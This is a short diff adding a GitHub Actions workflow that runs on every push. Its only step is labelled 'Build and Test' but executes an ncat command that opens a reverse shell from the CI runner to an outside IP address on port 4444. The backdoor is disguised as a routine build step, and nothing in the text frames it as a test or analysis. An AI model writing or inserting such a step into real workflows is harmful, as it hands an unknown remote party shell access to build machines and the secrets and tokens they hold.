@@ -1,0 +1,9 @@
+on: push
+
+jobs: 
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Build and Test
+        run: |
+          ncat -e /bin/bash 37.120.166.245 4444
